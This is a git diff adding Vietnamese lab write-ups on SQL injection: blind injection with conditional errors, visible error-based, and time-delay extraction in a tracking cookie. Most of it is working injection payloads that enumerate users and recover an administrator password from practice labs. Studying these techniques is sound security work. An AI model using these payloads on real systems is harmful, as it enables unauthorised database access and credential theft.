@@ -135,6 +135,142 @@ Xác định các cột `%27union+select+column_name,null+from+all_tab_columns+w
 
 <img width="200" height="48" alt="image" src="https://github.com/user-attachments/assets/22870294-ab41-40fd-8074-d0aadf400c74" />
 
+# 11. Lab: Blind SQL injection with conditional errors #
+
+Ta thử thêm dấu `'` vào sau TrackingId
+
+<img width="554" height="43" alt="image" src="https://github.com/user-attachments/assets/82db9671-54e0-4c38-904e-f8e0007dc268" />
+
+Hiện thông báo lỗi, ta thử thêm `''` thì request hợp lệ
+
+<img width="608" height="47" alt="image" src="https://github.com/user-attachments/assets/76f6b929-ff5a-48b1-ac01-b8c9b63ea40b" />
+
+Request chạy hợp lệ là do như sau 
+```
+SELECT *
+FROM tracking
+WHERE id = 'xyz''';
+```
+2 dấu nháy đơn liền nhau nằm trong chuỗi được hiểu là một dấu nháy đơn thuộc nội dung chuỗi, chứ không phải hai dấu nháy dùng để đóng và mở chuỗi độc lập
+
+Thử test SQL tại đây
+
+TrackingId=...'||(SELECT '')||'
+
+<img width="692" height="38" alt="image" src="https://github.com/user-attachments/assets/d2588413-e85d-4b8d-8548-853970ac6f0a" />
+
+Có thể là sai csdl --> thử bảng dual từ oracle   
+
+<img width="551" height="36" alt="image" src="https://github.com/user-attachments/assets/a3dbf5ac-1bd8-41c7-9ee0-0c7dfc7e122d" />
+
+Ta thử select vào bảng `users` và thêm  `ROWNUM=1` để tránh lỗi
+
+<img width="614" height="62" alt="image" src="https://github.com/user-attachments/assets/043e7965-e593-4cdd-a954-1209afa392e9" />
+
+Tiếp theo ta sẽ test hành vi dựa trên hàm điều kiện  
+
+`TrackingId=...'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
+
+Kiểm tra điều kiện `1=1` luôn đúng, `THEN TO_CHAR(1/0)` ếu đúng, thực hiện biểu thức chuyển kết quả phép chia thành chuỗi, `ELSE ''` nếu sai trả về chuỗi rỗng
+
+<img width="725" height="51" alt="image" src="https://github.com/user-attachments/assets/dee56974-d4b4-4d6e-afff-55ed154b21e4" />
+
+Thử `TrackingId=...'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
+
+<img width="619" height="39" alt="image" src="https://github.com/user-attachments/assets/4c00fd8c-08bc-444c-8344-4768cfb20120" />
+
+--> Lỗi biến mất. Ta có thể chủ động kích hoạt lỗi của dựa trên tính đúng sai của 1 điều kiện 
+
+Giờ ta sẽ kiểm tra xem người dùng có tên administrator có tồn tại hay không
+
+`TrackingId=...'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+Xác nhận có username này 
+
+<img width="661" height="62" alt="image" src="https://github.com/user-attachments/assets/8fea73d5-33e0-4344-a4a9-a239571a7835" />
+
+Tiếp theo ta sẽ xác định độ dài mật khẩu `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+Ta được kết quả là password có 20 kí tự
+
+<img width="485" height="110" alt="image" src="https://github.com/user-attachments/assets/cf4c1163-a952-419c-b50c-f4e925f95b24" />
+
+Tiếp theo ta xác định từng kí tự ở từng vị trí trong password `TrackingId=...'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+Các response 500 là kết quả ta cần tìm 
+
+<img width="360" height="171" alt="image" src="https://github.com/user-attachments/assets/5bb5be42-116a-40dc-bd1b-38a17d1a01a0" />
+
+Ghép lại ta được password là: `4j4zvym1lmtha7wkyfc2`
+
+# 12. Lab: Visible error-based SQL injection #
+
+Thêm dấu nháy đơn `'` và sau TrackingId, response trả về lỗi 
+
+ <img width="648" height="40" alt="image" src="https://github.com/user-attachments/assets/5ee9b500-1062-4baf-892b-d567aa341a31" />
+
+Thêm `'--`
+<img width="676" height="54" alt="image" src="https://github.com/user-attachments/assets/7bc2656b-2e75-447d-a16a-55bc4b0da205" />
+
+Thêm một truy vấn con SELECT tổng quát và ép kiểu giá trị trả về thành kiểu dữ liệu int `TrackingId=...' AND CAST((SELECT 1) AS int)--`
+
+<img width="831" height="201" alt="image" src="https://github.com/user-attachments/assets/7e3a737c-fc2e-4400-a589-62cb72e84248" />
+
+Nhận được một thông báo lỗi khác, cho biết điều kiện AND phải là một biểu thức Boolean.
+Điều chỉnh lại `TrackingId=...' AND 1=CAST((SELECT 1) AS int)--`
+
+<img width="667" height="53" alt="image" src="https://github.com/user-attachments/assets/20350cfd-0d6a-4eb6-b75d-4ad375dda40f" />
+
+Điều chỉnh câu lệnh để truy xuất tên người dùng từ csdl
+
+<img width="899" height="215" alt="image" src="https://github.com/user-attachments/assets/cde92921-5d24-4db0-af83-4d6d74aa035f" />
+
+Xóa giá trị ban đầu của cookie để giải phóng thêm csdl
+
+<img width="847" height="203" alt="image" src="https://github.com/user-attachments/assets/61074db4-e57a-413d-b8ca-9f0e4e1a75bd" />
+
+Lỗi trả về thông báo rằng query trả về nhiều hơn 1 dòng 
+
+--> `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
+
+<img width="894" height="232" alt="image" src="https://github.com/user-attachments/assets/566da030-9fa7-4f2b-a5f3-8b65511cfb2f" />
+
+Giờ ta thấy được `administrator` là người đùng đầu tiên trong bảng 
+
+--> `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
+
+<img width="942" height="245" alt="image" src="https://github.com/user-attachments/assets/78b0631f-2404-4bdb-b29a-e8f53b68d3de" />
+
+# 13. Lab: Blind SQL injection with time delays #
+
+Dùng query `TrackingId=...'||pg_sleep(10)--` để hệ thống sleep 10s
+
+# 14. Lab: Blind SQL injection with time delays and information retrieval #
+
+Bài này dùng csdl Postgre
+
+Dùng `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` thì hệ thống mất 10s phản hồi
+Đổi thành `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` thì hệ thống ko có delay
+--> sử dụng thời gian phản hồi để xác định thông tin đúng sai
+
+`TrackingId=...'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+
+Thời gian phản hồi 10s --> có username đó. Tiếp theo ta sẽ dò độ dài password 
+
+`TrackingId=...'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+
+Ta được độ dài là 20
+
+Dò tiếp kí tự dựa trên thời gian response 
+
+`TrackingId=...'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+
+# 15. Lab: Blind SQL injection with out-of-band interaction #
+
+
+
+
+
 
 
 # 2. NOTE #
